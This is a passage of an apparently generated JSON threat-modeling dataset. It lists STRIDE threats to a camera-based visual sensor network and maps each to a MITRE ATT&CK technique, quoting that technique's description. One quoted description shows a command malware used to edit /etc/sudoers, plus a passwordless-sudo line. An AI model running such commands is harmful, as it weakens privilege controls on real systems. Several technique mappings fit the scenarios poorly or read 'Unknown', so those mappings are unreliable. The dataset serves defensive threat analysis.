                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a software vulnerability to gain access to the visual data stored on the server.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability exists in server software",
                    "Role": "Software Developer",
                    "Condition": "Unpatched system vulnerabilities"
                },
                {
                    "Assumption": "Server is exposed to the internet",
                    "Role": "Network Administrator",
                    "Condition": "Inappropriate firewall rules"
                },
                {
                    "Assumption": "Weak access control measures",
                    "Role": "Security Analyst",
                    "Condition": "Weak authentication methods"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive visual data on the server.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "server access",
                "data breach",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the network with excessive requests, disrupting the transmission of visual data.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks rate limiting mechanisms",
                    "Role": "System Architect",
                    "Condition": "Inadequate network traffic management"
                },
                {
                    "Assumption": "Attacker can send numerous requests",
                    "Role": "User",
                    "Condition": "Absence of request limits"
                },
                {
                    "Assumption": "Insufficient DDoS protection",
                    "Role": "Security Analyst",
                    "Condition": "Lack of DDoS mitigation tools"
                }
            ],
            "Potential Impact": "Disruption of visual data transmission, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network flooding",
                "traffic management",
                "data disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious commands are sent to the VSN, causing camera nodes to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Weak command validation",
                    "Role": "System Developer",
                    "Condition": "Lack of input sanitization"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Network Administrator",
                    "Condition": "Unsegmented network"
                },
                {
                    "Assumption": "No tamper-proof mechanisms on nodes",
                    "Role": "Physical Security",
                    "Condition": "Physically accessible nodes"
                }
            ],
            "Potential Impact": "Camera nodes become unresponsive, impacting system operation.",
            "MITRE ATT&CK Keywords": [
                "device unavailability",
                "command injection",
                "node freezing",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a software vulnerability causing the VSN server to crash.",
            "Assumptions": [
                {
                    "Assumption": "Server software has vulnerabilities",
                    "Role": "Software Developer",
                    "Condition": "Unpatched or outdated software"
                },
                {
                    "Assumption": "Attacker can access the server remotely",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate network security"
                },
                {
                    "Assumption": "No intrusion prevention mechanisms",
                    "Role": "Security Analyst",
                    "Condition": "Lack of IDS/IPS"
                }
            ],
            "Potential Impact": "Visual sensor network server crashes, impacting data availability.",
            "MITRE ATT&CK Keywords": [
                "server crash",
                "vulnerability exploitation",
                "software bug",
                "availability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A lower-privileged user exploits a vulnerability to gain administrative access to the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Existing software vulnerability allows privilege escalation",
                    "Role": "Software Developer",
                    "Condition": "Unpatched software"
                },
                {
                    "Assumption": "Weak user access controls",
                    "Role": "System Architect",
                    "Condition": "Inadequate privilege management"
                },
                {
                    "Assumption": "Monitoring for unusual activity is insufficient",
                    "Role": "Security Analyst",
                    "Condition": "Lack of behavioral analysis tools"
                }
            ],
            "Potential Impact": "Unauthorized access and control over the VSN, potential for further system compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "access control",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfigured camera node to execute code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Camera nodes have a misconfiguration",
                    "Role": "Device Administrator",
                    "Condition": "Human error or lack of secure setup"
                },
                {
                    "Assumption": "Access to camera nodes is not restricted",
                    "Role": "Security Analyst",
                    "Condition": "Weak access policy"
                },
                {
                    "Assumption": "No regular audits of device security",
                    "Role": "System Administrator",
                    "Condition": "Lack of security audits and inspections"
                }
            ],
            "Potential Impact": "Execution of unauthorized code, compromising device and system integrity.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "code execution",
                "device compromise",
                "elevated privileges"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Software flaws allow users to perform actions beyond their permissions, such as altering network configurations.",
            "Assumptions": [
                {
                    "Assumption": "Software has flaws allowing privilege bypass",
                    "Role": "Software Developer",
                    "Condition": "Poor quality assurance testing"
                },
                {
                    "Assumption": "Users have extensive network access",
                    "Role": "IT Administrator",
                    "Condition": "Inappropriate user policies"
                },
                {
                    "Assumption": "Logging and monitoring are not robust",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate logging mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized system changes and potential compromise of system integrity.",
            "MITRE ATT&CK Keywords": [
                "software flaw",
                "permission bypass",
                "network configuration",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their device as a legitimate camera node within the Visual Sensor Network (VSN).",
            "Assumptions": [
                {
                    "Assumption": "The system does not have robust authentication mechanisms for verifying device identities.",
                    "Role": "System Design",
                    "Condition": "True when authentication is weak or non-existent."
                },
                {
                    "Assumption": "The attacker has physical access to the network or the ability to place a disguised device within communication range.",
                    "Role": "Attacker Capability",
                    "Condition": "True if the attacker has physical proximity to the network."
                },
                {
                    "Assumption": "The network relies on device IDs that can be easily guessed or spoofed.",
                    "Role": "Device Identification",
                    "Condition": "True if IDs are predictable or not securely assigned."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data, and potential tampering with data integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing emails to trick network administrators into providing their login credentials.",
            "Assumptions": [
                {
                    "Assumption": "Administrators use email for official communication and can be targeted.",
                    "Role": "User Behavior",
                    "Condition": "True if administrators are susceptible to phishing."
                },
                {
                    "Assumption": "Email systems do not have advanced anti-phishing protections.",
                    "Role": "System Security",
                    "Condition": "True if email systems are not fully secure or monitored."
                },
                {
                    "Assumption": "Attackers can craft convincing phishing emails.",
                    "Role": "Attacker Capability",
                    "Condition": "True if attackers have the resources to create realistic phishing emails."
                }
            ],
            "Potential Impact": "Compromise of network control, unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "email",
                "credential harvesting",
                "network"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and alters communication between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Communication between nodes and the server is not encrypted.",
                    "Role": "System Design",
                    "Condition": "True if the communication protocol lacks encryption."
                },
                {
                    "Assumption": "The attacker has access to the network traffic.",
                    "Role": "Attacker Capability",
                    "Condition": "True if they have access to the network or can use a man-in-the-middle technique."
                },
                {
                    "Assumption": "The central server does not verify the integrity of incoming data.",
                    "Role": "System Design",
                    "Condition": "True if integrity checks are not in place."
                }
            ],
            "Potential Impact": "Corruption of data integrity, unauthorized control over data transmission.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network",
                "interception",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of a camera node to capture, alter, or destroy visual data.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely managed.",
                    "Role": "System Design",
                    "Condition": "True if updates can be made without robust authentication."
                },
                {
                    "Assumption": "The attacker has physical or network access to the camera node.",
                    "Role": "Attacker Capability",
                    "Condition": "True if camera nodes are not physically or logically well protected."
                },
                {
                    "Assumption": "Built-in security mechanisms of the camera can be bypassed.",
                    "Role": "Device Security",
                    "Condition": "True if security features are weak or absent."
                }
            ],
            "Potential Impact": "Corruption or loss of visual data and its integrity.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "device",
                "IoT"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a known vulnerability in the Linux OS to gain unauthorized access to data.",
            "Assumptions": [
                {
                    "Assumption": "The application uses Linux versions vulnerable to specific CVEs.",
                    "Role": "System Version",
                    "Condition": "True if the system is unpatched or running vulnerable versions."
                },
                {
                    "Assumption": "The attacker knows the CVE details and exploits it accordingly.",
                    "Role": "Attacker Knowledge",
                    "Condition": "True if the attacker has technical knowledge of the vulnerability."
                },
                {
                    "Assumption": "Vulnerability mitigations (e.g., patches) are not in place.",
                    "Role": "System Maintenance",
                    "Condition": "True if security patches are not applied."
                }
            ],
            "Potential Impact": "Tampering with system files or gaining control over the system.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "Linux",
                "tampering",
                "remote"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious insider alters configuration files to misroute visual data or disable camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have high-level access to configuration files.",
                    "Role": "Insider Permissions",
                    "Condition": "True if insiders have broad access rights."
                },
                {
                    "Assumption": "Configuration changes are not logged or monitored in real time.",
                    "Role": "System Monitoring",
                    "Condition": "True if change management and logging are weak."
                },
                {
                    "Assumption": "The insider has malicious intent or can be coerced.",
                    "Role": "Insider Motivations",
                    "Condition": "True if the insider is susceptible to insider threat scenarios."
                }
            ],
            "Potential Impact": "System integrity compromised, visual data rerouted or lost.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "tampering",
                "configuration",
                "IoT"
            ],
            "mitre_technique": {
                "name": "Sudo and Sudo Caching",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0",
                "technique_id": "T1548.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes log files to erase evidence of their actions.",
            "Assumptions": [
                {
                    "Assumption": "Log management practices are insufficient to prevent unauthorized modification or deletion.",
                    "Role": "System Design",
                    "Condition": "True if logs are not protected and auditable."
                },
                {
                    "Assumption": "The attacker has access rights necessary to delete logs.",
                    "Role": "Attacker Capability",
                    "Condition": "True if access controls are weak or compromised."
                },
                {
                    "Assumption": "Log backups are either non-existent or as easily accessible as live logs.",
                    "Role": "System Maintenance",
                    "Condition": "True if backups are not securely stored."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "log deleting",
                "audit trails",
                "repudiation",
                "evidence"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
